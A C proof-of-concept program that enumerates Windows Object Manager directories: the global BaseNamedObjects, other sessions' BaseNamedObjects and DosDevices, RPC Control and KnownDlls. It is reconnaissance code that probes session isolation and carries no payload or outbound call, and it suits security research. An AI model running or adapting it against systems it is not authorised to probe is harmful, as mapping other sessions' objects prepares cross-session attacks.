/*
 * poc1_xsession_enum.c — Cross-Session Object Directory Enumeration
 *
 * Demonstrates that \Sessions\X\BaseNamedObjects directories are
 * enumerable from other sessions if you know the path.
 *
 * The Windows Object Manager namespace is a SINGLE tree. Session
 * isolation is NOT enforced at the object manager level — only by
 * default ACLs on per-session directories and DOS device maps.
 *
 * This PoC:
 * 1. Opens \BaseNamedObjects (all sessions share the global root)
 * 2. Enumerates objects visible there
 * 3. Tries to open \Sessions\<ID>\BaseNamedObjects for each session
 * 4. If successful, enumerates that session's named objects too
 *
 * Build: gcc -o poc1_xsession_enum.exe poc1_xsession_enum.c -lntdll
 * Run:   poc1_xsession_enum.exe
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <psapi.h>

/* NT API types we need */
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;


/* Object directory access rights (from ntdef.h / winternl.h) */
#ifndef DIRECTORY_QUERY
#define DIRECTORY_QUERY        (0x0001)
#define DIRECTORY_TRAVERSE     (0x0002)
#define DIRECTORY_CREATE_OBJECT (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY (0x0008)
#define DIRECTORY_ALL_ACCESS    (0x000F0000 | 0xF)
#endif
/* NT API function pointers */
typedef NTSTATUS (NTAPI *pNtOpenDirectoryObject)(
    PHANDLE DirectoryHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS (NTAPI *pNtQueryDirectoryObject)(
    HANDLE DirectoryHandle,
    PVOID Buffer,
    ULONG BufferLength,
    BOOLEAN ReturnSingleEntry,
    BOOLEAN RestartScan,
    PULONG Context,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* WCHAR helper macros */
#define WIDEN2(x) L##x
#define WIDEN(x) WIDEN2(x)

/* Object type name constants */
static const WCHAR *KNOWN_TYPES[] = {
    L"Event", L"Mutant", L"Section", L"File", L"SymbolicLink",
    L"Directory", L"EventPair", L"Key", L"KeyedEvent",
    L"Port", L"Process", L"Thread", L"Token", L"Timer",
    L"IoCompletion", L"Job", L"ALPC Port", L"Semaphore"
};
#define NUM_TYPES (sizeof(KNOWN_TYPES)/sizeof(KNOWN_TYPES[0]))

/* Unicode string helpers */
static void init_ustr(PUNICODE_STRING ustr, PCWSTR str) {
    ustr->Buffer = (PWSTR)str;
    ustr->Length = (USHORT)(wcslen(str) * sizeof(WCHAR));
    ustr->MaximumLength = ustr->Length + sizeof(WCHAR);
}

/* Load NT functions from ntdll */
static void load_nt_funcs(pNtOpenDirectoryObject *openDir,
                          pNtQueryDirectoryObject *queryDir,
                          pNtClose *ntClose) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    *openDir = (pNtOpenDirectoryObject)GetProcAddress(ntdll, "NtOpenDirectoryObject");
    *queryDir = (pNtQueryDirectoryObject)GetProcAddress(ntdll, "NtQueryDirectoryObject");
    *ntClose = (pNtClose)GetProcAddress(ntdll, "NtClose");
}

static void enumerate_dir(HANDLE hDir, pNtQueryDirectoryObject queryDir) {
    ULONG context = 0;
    BOOLEAN first = TRUE;
    int count = 0;

    while (1) {
        WCHAR buffer[1024];
        ULONG retLen = 0;
        NTSTATUS s = queryDir(hDir, buffer, sizeof(buffer), TRUE, first, &context, &retLen);
        if (s != 0) break;
        first = FALSE;

        POBJECT_DIRECTORY_INFORMATION info = (POBJECT_DIRECTORY_INFORMATION)buffer;
        if (info->Name.Buffer == NULL) break;

        /* Print the object name and type */
        wprintf(L"  %-50ls  %ls\n", info->Name.Buffer, info->TypeName.Buffer ? info->TypeName.Buffer : L"(unknown)");
        count++;
    }
    if (count == 0) {
        wprintf(L"  (empty directory or no access)\n");
    } else {
        wprintf(L"  → %d objects\n", count);
    }
}

static HANDLE open_object_dir(pNtOpenDirectoryObject openDir, PCWSTR path) {
    HANDLE hDir = NULL;
    UNICODE_STRING objName;
    OBJECT_ATTRIBUTES oa;
    WCHAR fullPath[512];

    /* Build the NT path */
    wcscpy(fullPath, L"\\");
    wcscat(fullPath, path);

    init_ustr(&objName, fullPath);
    InitializeObjectAttributes(&oa, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS s = openDir(&hDir, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &oa);
    if (s == 0) return hDir;

    return NULL;
}

int main() {
    pNtOpenDirectoryObject NtOpenDirectoryObject;
    pNtQueryDirectoryObject NtQueryDirectoryObject;
    pNtClose NtClose;
    HANDLE hBase = NULL, hGlobal = NULL;
    DWORD mySessionId;
    ULONG i;

    printf("=== PoC 1: Cross-Session Object Directory Enumeration ===\n\n");

    /* Load NT functions */
    load_nt_funcs(&NtOpenDirectoryObject, &NtQueryDirectoryObject, &NtClose);
    if (!NtOpenDirectoryObject || !NtQueryDirectoryObject) {
        printf("[-] Failed to load NT functions\n");
        return 1;
    }

    /* Get current session ID */
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mySessionId)) {
        printf("[-] Failed to get session ID\n");
        return 1;
    }
    printf("[*] Running in Session %lu\n\n", mySessionId);

    /* STEP 1: Enumerate \BaseNamedObjects */
    printf("[1] Enumerating \\BaseNamedObjects (Global + Per-Session Root):\n");
    wprintf(L"    Directory: \\BaseNamedObjects\n");
    hBase = open_object_dir(NtOpenDirectoryObject, L"BaseNamedObjects");
    if (hBase) {
        enumerate_dir(hBase, NtQueryDirectoryObject);
        NtClose(hBase);
    } else {
        printf("    (ACCESS DENIED - this should not happen)\n");
    }

    /* STEP 2: Enumerate \BaseNamedObjects\Global */
    printf("\n[2] Enumerating \\BaseNamedObjects\\Global (the shared namespace):\n");
    hGlobal = open_object_dir(NtOpenDirectoryObject, L"BaseNamedObjects\\Global");
    if (hGlobal) {
        enumerate_dir(hGlobal, NtQueryDirectoryObject);
        NtClose(hGlobal);
    } else {
        printf("    (ACCESS DENIED)\n");
    }

    /* STEP 3: Try to enumerate OTHER sessions' BaseNamedObjects */
    printf("\n[3] Attempting cross-session enumeration:\n");
    for (i = 0; i <= 10; i++) {
        WCHAR path[512];
        HANDLE hOther;

        if (i == mySessionId) continue; /* skip our own session */

        wsprintfW(path, L"Sessions\\%lu\\BaseNamedObjects", i);
        hOther = open_object_dir(NtOpenDirectoryObject, path);
        if (hOther) {
            wprintf(L"  [+] Opened \\%ls\n", path);
            wprintf(L"  [+] Contents:\n");
            enumerate_dir(hOther, NtQueryDirectoryObject);
            NtClose(hOther);
        } else {
            wprintf(L"  [-] \\%ls → ACCESS DENIED\n", path);
        }
    }

    /* STEP 4: Try DosDevices per-session */
    printf("\n[4] Attempting DosDevices cross-session access:\n");
    for (i = 0; i <= 10; i++) {
        WCHAR path[512];
        HANDLE hOther;

        if (i == mySessionId) continue;

        wsprintfW(path, L"Sessions\\%lu\\DosDevices", i);
        hOther = open_object_dir(NtOpenDirectoryObject, path);
        if (hOther) {
            wprintf(L"  [+] Opened \\%ls\n", path);
            wprintf(L"  [+] Contents:\n");
            enumerate_dir(hOther, NtQueryDirectoryObject);
            NtClose(hOther);
        } else {
            wprintf(L"  [-] \\%ls → ACCESS DENIED\n", path);
        }
    }

    /* STEP 5: Check RPC Control (global across machine) */
    printf("\n[5] Checking \\RPC Control (global ALPC endpoint namespace):\n");
    hGlobal = open_object_dir(NtOpenDirectoryObject, L"RPC Control");
    if (hGlobal) {
        printf("  [+] Opened \\RPC Control\n");
        enumerate_dir(hGlobal, NtQueryDirectoryObject);
        NtClose(hGlobal);
    } else {
        printf("  [-] \\RPC Control → ACCESS DENIED\n");
    }

    /* STEP 6: Check if KnownDlls is cross-session */
    printf("\n[6] Checking \\KnownDlls (shared across sessions):\n");
    hGlobal = open_object_dir(NtOpenDirectoryObject, L"KnownDlls");
    if (hGlobal) {
        printf("  [+] Opened \\KnownDlls\n");
        enumerate_dir(hGlobal, NtQueryDirectoryObject);
        NtClose(hGlobal);
    } else {
        printf("  [-] \\KnownDlls → ACCESS DENIED\n");
    }

    printf("\n=== Demonstration Complete ===\n");
    return 0;
}
